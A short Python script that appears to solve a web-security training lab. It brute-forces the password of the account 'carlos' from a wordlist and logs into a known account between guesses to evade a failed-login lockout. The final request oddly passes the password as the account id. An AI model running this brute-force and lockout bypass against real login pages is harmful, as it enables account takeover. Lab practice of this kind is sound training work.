import requests
import sys
from bs4 import BeautifulSoup

s = requests.Session()

site = 'ac921fe71e3f702080b16df6008b00d2.web-security-academy.net'

login_url = f'''https://{site}/login'''

resp = s.get(login_url)
soup = BeautifulSoup(resp.text,'html.parser')

lines = open("auth-lab-passwords","r").readlines()

for user in lines:
    target = user.strip()
    logindata = {
        'username' : 'carlos',
        'password' : target
    }

    def login_wiener():
      logindata = {
        'username' : 'wiener',
        'password' : 'peter'
      }
      s.post(login_url, data=logindata)
    
    login_wiener()

    resp = s.post(login_url, data=logindata)
    soup = BeautifulSoup(resp.text,'html.parser')
    try:
      if 'password' not in soup.find('p', {'class':'is-warning'}).text:
          print(f'password is {target}')
          break
    
    except:
      print(f'password is {target}')
      break
    


s.get(f'https://{site}/my-account?id={target}')

'''Part 4 (Forgot to save previous versions)'''